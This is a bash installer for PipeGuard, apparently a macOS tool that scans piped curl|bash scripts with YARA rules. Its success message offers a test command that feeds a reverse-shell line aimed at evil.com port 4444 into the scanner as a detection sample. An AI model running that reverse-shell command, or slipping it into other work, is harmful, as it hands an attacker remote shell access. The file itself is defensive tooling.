#!/bin/bash
#
# PipeGuard Installer
# Protects macOS users from malicious curl|bash attacks
#
# Usage:
#   curl -fsSL https://raw.githubusercontent.com/user/pipeguard/main/install.sh | bash
#   # or
#   ./install.sh
#
# Options:
#   --uninstall    Remove PipeGuard completely
#   --no-shell     Skip shell integration (binary only)
#   --prefix DIR   Install to custom directory (default: ~/.local)
#

set -euo pipefail

# =============================================================================
# Configuration
# =============================================================================

PIPEGUARD_VERSION="0.1.0"
INSTALL_PREFIX="${HOME}/.local"
BIN_DIR="${INSTALL_PREFIX}/bin"
SHARE_DIR="${INSTALL_PREFIX}/share/pipeguard"
CONFIG_DIR="${HOME}/.config/pipeguard"

# Colors (with fallback for non-color terminals)
if [[ -t 1 ]] && [[ "${TERM:-}" != "dumb" ]]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[0;33m'
    BLUE='\033[0;34m'
    MAGENTA='\033[0;35m'
    CYAN='\033[0;36m'
    BOLD='\033[1m'
    DIM='\033[2m'
    RESET='\033[0m'
else
    RED='' GREEN='' YELLOW='' BLUE='' MAGENTA='' CYAN='' BOLD='' DIM='' RESET=''
fi

# =============================================================================
# Helper Functions
# =============================================================================

info() {
    printf "${BLUE}==>${RESET} ${BOLD}%s${RESET}\n" "$1"
}

success() {
    printf "${GREEN}==>${RESET} ${BOLD}%s${RESET}\n" "$1"
}

warn() {
    printf "${YELLOW}==> Warning:${RESET} %s\n" "$1" >&2
}

error() {
    printf "${RED}==> Error:${RESET} %s\n" "$1" >&2
}

fatal() {
    error "$1"
    exit 1
}

# Check if command exists
has_cmd() {
    command -v "$1" >/dev/null 2>&1
}

# Backup a file before modifying
backup_file() {
    local file="$1"
    if [[ -f "$file" ]]; then
        cp "$file" "${file}.pipeguard-backup.$(date +%Y%m%d%H%M%S)"
    fi
}

# Add line to file if not present
add_to_file() {
    local file="$1"
    local line="$2"
    local marker="$3"

    if [[ -f "$file" ]] && grep -qF "$marker" "$file" 2>/dev/null; then
        return 0  # Already present
    fi

    backup_file "$file"

    # Ensure file exists and has newline at end
    touch "$file"
    if [[ -s "$file" ]] && [[ "$(tail -c1 "$file" | wc -l)" -eq 0 ]]; then
        echo "" >> "$file"
    fi

    echo "$line" >> "$file"
}

# Remove PipeGuard lines from file
remove_from_file() {
    local file="$1"
    local marker="$2"

    if [[ -f "$file" ]] && grep -qF "$marker" "$file" 2>/dev/null; then
        backup_file "$file"
        grep -vF "$marker" "$file" > "${file}.tmp" || true
        mv "${file}.tmp" "$file"
    fi
}

# =============================================================================
# Installation Functions
# =============================================================================

check_macos() {
    if [[ "$(uname -s)" != "Darwin" ]]; then
        fatal "PipeGuard is designed for macOS. Detected: $(uname -s)"
    fi

    info "Detected macOS $(sw_vers -productVersion)"
}

check_architecture() {
    local arch
    arch="$(uname -m)"

    case "$arch" in
        x86_64)
            info "Architecture: Intel (x86_64)"
            ARCH="x86_64"
            ;;
        arm64)
            info "Architecture: Apple Silicon (arm64)"
            ARCH="arm64"
            ;;
        *)
            fatal "Unsupported architecture: $arch"
            ;;
    esac
}

check_dependencies() {
    info "Checking dependencies..."

    # Check for Homebrew (preferred for YARA)
    if ! has_cmd brew; then
        warn "Homebrew not found. YARA library is required."
        echo ""
        echo "Install Homebrew first:"
        echo "  /bin/bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
        echo ""
        echo "Then install YARA:"
        echo "  brew install yara"
        echo ""
        fatal "Please install Homebrew and YARA, then run this installer again."
    fi

    # Check for YARA
    if ! brew list yara &>/dev/null; then
        info "Installing YARA via Homebrew..."
        brew install yara
    else
        info "YARA already installed"
    fi

    # Verify YARA library is accessible
    local yara_lib
    if [[ -d "/opt/homebrew/opt/yara/lib" ]]; then
        yara_lib="/opt/homebrew/opt/yara/lib"
    elif [[ -d "/usr/local/opt/yara/lib" ]]; then
        yara_lib="/usr/local/opt/yara/lib"
    else
        fatal "YARA library not found. Try: brew reinstall yara"
    fi

    info "YARA library found at: $yara_lib"
}

detect_shells() {
    info "Detecting installed shells..."

    SHELLS_TO_CONFIGURE=()

    # Check for Zsh
    if has_cmd zsh; then
        SHELLS_TO_CONFIGURE+=(zsh)
        info "  Found: zsh"
    fi

    # Check for Bash
    if has_cmd bash; then
        # Check bash version (need 4+ for full features)
        local bash_version
        bash_version="$(bash --version | head -1 | grep -oE '[0-9]+\.[0-9]+' | head -1)"
        local bash_major="${bash_version%%.*}"

        SHELLS_TO_CONFIGURE+=(bash)
        if [[ "$bash_major" -lt 4 ]]; then
            warn "Bash version $bash_version detected. Version 4+ recommended for best experience."
            warn "Install newer bash: brew install bash"
        else
            info "  Found: bash $bash_version"
        fi
    fi

    if [[ ${#SHELLS_TO_CONFIGURE[@]} -eq 0 ]]; then
        fatal "No supported shells found (zsh or bash required)"
    fi

    # Detect default shell
    DEFAULT_SHELL="$(basename "$SHELL")"
    info "Default shell: $DEFAULT_SHELL"
}

create_directories() {
    info "Creating directories..."

    mkdir -p "$BIN_DIR"
    mkdir -p "$SHARE_DIR/rules"
    mkdir -p "$SHARE_DIR/shell"
    mkdir -p "$CONFIG_DIR"

    success "Created installation directories"
}

install_binary() {
    info "Installing PipeGuard binary..."

    local source_binary=""
    local script_dir
    script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

    # Check for pre-built binary in script directory
    if [[ -f "${script_dir}/target/release/pipeguard" ]]; then
        source_binary="${script_dir}/target/release/pipeguard"
        info "Using local release binary"
    elif [[ -f "${script_dir}/pipeguard" ]]; then
        source_binary="${script_dir}/pipeguard"
        info "Using bundled binary"
    else
        # Need to build from source
        if [[ -f "${script_dir}/Cargo.toml" ]]; then
            info "Building from source..."

            if ! has_cmd cargo; then
                fatal "Rust/Cargo not found. Install from: https://rustup.rs"
            fi

            # Set YARA paths for compilation
            if [[ -d "/opt/homebrew/opt/yara" ]]; then
                export YARA_LIBRARY_PATH="/opt/homebrew/opt/yara/lib"
                export C_INCLUDE_PATH="/opt/homebrew/opt/yara/include"
            else
                export YARA_LIBRARY_PATH="/usr/local/opt/yara/lib"
                export C_INCLUDE_PATH="/usr/local/opt/yara/include"
            fi

            (cd "$script_dir" && cargo build --release) || fatal "Build failed"
            source_binary="${script_dir}/target/release/pipeguard"
        else
            fatal "No binary found and cannot build (not in source directory)"
        fi
    fi

    # Install binary
    cp "$source_binary" "${BIN_DIR}/pipeguard"
    chmod +x "${BIN_DIR}/pipeguard"

    success "Installed binary to ${BIN_DIR}/pipeguard"
}

install_rules() {
    info "Installing YARA rules..."

    local script_dir
    script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

    if [[ -d "${script_dir}/rules" ]]; then
        cp -r "${script_dir}/rules/"* "${SHARE_DIR}/rules/"
        success "Installed YARA rules to ${SHARE_DIR}/rules/"
    else
        warn "No rules directory found, using built-in rules only"
    fi
}

install_shell_integration() {
    info "Installing shell integration..."

    local script_dir
    script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

    # Copy shell integration scripts
    if [[ -d "${script_dir}/shell" ]]; then
        cp "${script_dir}/shell/"* "${SHARE_DIR}/shell/" 2>/dev/null || true
    fi

    # Generate shell integration loader
    cat > "${SHARE_DIR}/shell/init.sh" << 'SHELL_INIT'
# PipeGuard Shell Integration Loader
# This file is sourced by your shell RC file

# Ensure pipeguard is in PATH
export PATH="${HOME}/.local/bin:${PATH}"

# Set YARA library path (required on macOS)
if [[ -d "/opt/homebrew/opt/yara/lib" ]]; then
    export DYLD_LIBRARY_PATH="/opt/homebrew/opt/yara/lib:${DYLD_LIBRARY_PATH:-}"
elif [[ -d "/usr/local/opt/yara/lib" ]]; then
    export DYLD_LIBRARY_PATH="/usr/local/opt/yara/lib:${DYLD_LIBRARY_PATH:-}"
fi

# Load shell-specific integration
PIPEGUARD_SHARE="${HOME}/.local/share/pipeguard"

if [[ -n "${ZSH_VERSION:-}" ]]; then
    # Zsh integration
    if [[ -f "${PIPEGUARD_SHARE}/shell/pipeguard.zsh" ]]; then
        source "${PIPEGUARD_SHARE}/shell/pipeguard.zsh"
    fi
elif [[ -n "${BASH_VERSION:-}" ]]; then
    # Bash integration
    if [[ -f "${PIPEGUARD_SHARE}/shell/pipeguard.bash" ]]; then
        source "${PIPEGUARD_SHARE}/shell/pipeguard.bash"
    fi
fi
SHELL_INIT

    success "Created shell integration loader"
}

configure_shell_rc() {
    local shell="$1"
    local rc_file=""
    local source_line="# PipeGuard shell integration
[ -f \"\${HOME}/.local/share/pipeguard/shell/init.sh\" ] && source \"\${HOME}/.local/share/pipeguard/shell/init.sh\""
    local marker="PipeGuard shell integration"

    case "$shell" in
        zsh)
            rc_file="${HOME}/.zshrc"
            ;;
        bash)
            # Bash on macOS uses .bash_profile for login shells
            if [[ -f "${HOME}/.bash_profile" ]]; then
                rc_file="${HOME}/.bash_profile"
            else
                rc_file="${HOME}/.bashrc"
            fi
            ;;
        *)
            warn "Unknown shell: $shell"
            return 1
            ;;
    esac

    add_to_file "$rc_file" "$source_line" "$marker"
    info "  Configured: $rc_file"
}

configure_shells() {
    info "Configuring shell RC files..."

    for shell in "${SHELLS_TO_CONFIGURE[@]}"; do
        configure_shell_rc "$shell"
    done

    success "Shell configuration complete"
}

create_default_config() {
    local config_file="${CONFIG_DIR}/config.toml"

    if [[ -f "$config_file" ]]; then
        info "Config file already exists, preserving: $config_file"
        return 0
    fi

    info "Creating default configuration..."

    cat > "$config_file" << 'CONFIG'
# PipeGuard Configuration
# See: pipeguard config --help

[detection]
# Enable YARA-based detection
enable_yara = true
# Enable sandbox analysis (macOS sandbox-exec)
enable_sandbox = true
# Analysis timeout in seconds
timeout_secs = 60

[response]
# Actions for different threat levels
# Options: allow, warn, prompt, block
low = "warn"
medium = "prompt"
high = "block"

[rules]
# Path to additional YARA rules (optional)
# custom_rules_path = "/path/to/custom/rules"

[allowlist]
# Allowlisted script hashes (SHA-256)
hashes = []
# Allowlisted download domains
domains = [
    "brew.sh",
    "raw.githubusercontent.com",
    "rust-lang.org",
    "get.docker.com",
]
CONFIG

    success "Created config: $config_file"
}

verify_installation() {
    info "Verifying installation..."

    # Check binary exists and is executable
    if [[ ! -x "${BIN_DIR}/pipeguard" ]]; then
        fatal "Binary not found or not executable"
    fi

    # Try to run pipeguard
    if ! "${BIN_DIR}/pipeguard" --version &>/dev/null; then
        error "Binary exists but failed to run"
        error "This might be a YARA library path issue."
        echo ""
        echo "Try adding to your shell RC file:"
        echo "  export DYLD_LIBRARY_PATH=\"/opt/homebrew/opt/yara/lib:\$DYLD_LIBRARY_PATH\""
        fatal "Verification failed"
    fi

    local version
    version="$("${BIN_DIR}/pipeguard" --version 2>/dev/null || echo "unknown")"
    success "Verified: $version"
}

print_success_message() {
    echo ""
    echo "${GREEN}${BOLD}========================================${RESET}"
    echo "${GREEN}${BOLD}  PipeGuard installed successfully!${RESET}"
    echo "${GREEN}${BOLD}========================================${RESET}"
    echo ""
    echo "Installation locations:"
    echo "  Binary:  ${CYAN}${BIN_DIR}/pipeguard${RESET}"
    echo "  Rules:   ${CYAN}${SHARE_DIR}/rules/${RESET}"
    echo "  Config:  ${CYAN}${CONFIG_DIR}/config.toml${RESET}"
    echo ""
    echo "${YELLOW}${BOLD}Next steps:${RESET}"
    echo ""
    echo "  1. ${BOLD}Restart your shell${RESET} or run:"
    echo "     ${DIM}source ~/.local/share/pipeguard/shell/init.sh${RESET}"
    echo ""
    echo "  2. ${BOLD}Test the protection:${RESET}"
    echo "     ${DIM}echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' | pipeguard scan${RESET}"
    echo ""
    echo "  3. ${BOLD}View configuration:${RESET}"
    echo "     ${DIM}pipeguard config show${RESET}"
    echo ""
    echo "  4. ${BOLD}Get help:${RESET}"
    echo "     ${DIM}pipeguard --help${RESET}"
    echo ""
    echo "${MAGENTA}Stay safe! PipeGuard is now protecting you from curl|bash attacks.${RESET}"
    echo ""
}

# =============================================================================
# Uninstall Functions
# =============================================================================

uninstall() {
    echo ""
    echo "${RED}${BOLD}Uninstalling PipeGuard...${RESET}"
    echo ""

    # Confirm
    read -p "Are you sure you want to uninstall PipeGuard? [y/N] " -n 1 -r
    echo ""
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        echo "Uninstall cancelled."
        exit 0
    fi

    local marker="PipeGuard shell integration"

    # Remove from shell RC files
    info "Removing shell configuration..."
    for rc_file in ~/.zshrc ~/.bashrc ~/.bash_profile; do
        if [[ -f "$rc_file" ]]; then
            remove_from_file "$rc_file" "$marker"
        fi
    done

    # Remove binary
    if [[ -f "${BIN_DIR}/pipeguard" ]]; then
        info "Removing binary..."
        rm -f "${BIN_DIR}/pipeguard"
    fi

    # Remove share directory
    if [[ -d "$SHARE_DIR" ]]; then
        info "Removing data files..."
        rm -rf "$SHARE_DIR"
    fi

    # Ask about config
    if [[ -d "$CONFIG_DIR" ]]; then
        read -p "Remove configuration directory ${CONFIG_DIR}? [y/N] " -n 1 -r
        echo ""
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            rm -rf "$CONFIG_DIR"
            info "Removed configuration"
        else
            info "Configuration preserved at: $CONFIG_DIR"
        fi
    fi

    echo ""
    success "PipeGuard has been uninstalled"
    echo ""
    echo "Note: YARA library was not removed. To remove it:"
    echo "  brew uninstall yara"
    echo ""
}

# =============================================================================
# Main
# =============================================================================

main() {
    echo ""
    echo "${CYAN}${BOLD}╔═══════════════════════════════════════╗${RESET}"
    echo "${CYAN}${BOLD}║         PipeGuard Installer           ║${RESET}"
    echo "${CYAN}${BOLD}║   Defense against curl|bash attacks   ║${RESET}"
    echo "${CYAN}${BOLD}╚═══════════════════════════════════════╝${RESET}"
    echo ""

    local skip_shell=false

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --uninstall)
                uninstall
                exit 0
                ;;
            --no-shell)
                skip_shell=true
                shift
                ;;
            --prefix)
                INSTALL_PREFIX="$2"
                BIN_DIR="${INSTALL_PREFIX}/bin"
                SHARE_DIR="${INSTALL_PREFIX}/share/pipeguard"
                shift 2
                ;;
            --help|-h)
                echo "Usage: $0 [OPTIONS]"
                echo ""
                echo "Options:"
                echo "  --uninstall    Remove PipeGuard completely"
                echo "  --no-shell     Skip shell integration (binary only)"
                echo "  --prefix DIR   Install to custom directory (default: ~/.local)"
                echo "  --help         Show this help message"
                exit 0
                ;;
            *)
                fatal "Unknown option: $1"
                ;;
        esac
    done

    # Run installation steps
    check_macos
    check_architecture
    check_dependencies
    detect_shells
    create_directories
    install_binary
    install_rules

    if [[ "$skip_shell" == false ]]; then
        install_shell_integration
        configure_shells
    fi

    create_default_config
    verify_installation
    print_success_message
}

# Run main function
main "$@"
